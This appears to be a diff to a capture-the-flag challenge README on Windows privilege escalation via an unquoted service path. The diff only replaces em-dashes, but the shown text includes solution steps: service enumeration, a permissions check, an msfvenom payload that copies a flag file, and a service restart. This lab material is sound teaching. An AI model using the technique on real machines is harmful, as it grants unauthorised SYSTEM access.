@@ -1,4 +1,4 @@
-# Challenge 1 — Unquoted Service Path
+# Challenge 1  Unquoted Service Path
 
 **Difficulty:** Easy  
 **Category:** Windows Privilege Escalation  
@@ -8,7 +8,7 @@
 
 ## Story
 
-You have a shell as `ctfplayer` — a low-privileged local user — on a Windows machine.
+You have a shell as `ctfplayer`  a low-privileged local user  on a Windows machine.
 There's a Windows service installed by a developer who wasn't careful about quoting paths.
 Windows is about to help you become SYSTEM.
 
@@ -80,7 +80,7 @@ icacls "C:\Program Files\Vulnerable App"
 You need to place an executable at the path Windows will try first.
 A minimal payload: a PowerShell one-liner compiled with `msfvenom`, or simply a `.bat` renamed to `.exe` that copies your file somewhere readable.
 
-For CTF purposes — drop a script that reads the flag and writes it to `C:\Users\ctfplayer\Desktop\result.txt`.
+For CTF purposes  drop a script that reads the flag and writes it to `C:\Users\ctfplayer\Desktop\result.txt`.
 </details>
 
 ---
@@ -88,9 +88,9 @@ For CTF purposes — drop a script that reads the flag and writes it to `C:\User
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Find the vulnerable service
+### Step 1  Find the vulnerable service
 
 ```powershell
 Get-WmiObject Win32_Service | Where-Object {
@@ -103,7 +103,7 @@ You'll see `VulnerableService` with path:
 C:\Program Files\Vulnerable App\bin\service.exe
 ```
 
-### Step 2 — Check write permissions
+### Step 2  Check write permissions
 
 ```powershell
 icacls "C:\Program Files\Vulnerable App"
@@ -113,7 +113,7 @@ icacls "C:\Program Files\Vulnerable App"
 
 Windows will try `C:\Program Files\Vulnerable.exe` before the real service binary.
 
-### Step 3 — Create your payload
+### Step 3  Create your payload
 
 Create a simple PowerShell script and save it as `Vulnerable.exe` in the right location.
 Since this is a CTF, a batch file renamed to .exe works to demonstrate the concept:
@@ -133,7 +133,7 @@ In a real engagement you'd use `msfvenom` to generate a proper executable:
 msfvenom -p windows/x64/exec CMD='cmd /c copy C:\Windows\System32\config\ctf\flag.txt C:\Users\Public\flag.txt' -f exe -o Vulnerable.exe
 ```
 
-### Step 4 — Restart the service (or wait for reboot)
+### Step 4  Restart the service (or wait for reboot)
 
 If you can restart the service:
 ```powershell
@@ -142,7 +142,7 @@ Restart-Service VulnerableService
 
 If not, trigger a reboot (in a real pentest you'd wait for next reboot).
 
-### Step 5 — Read the flag
+### Step 5  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
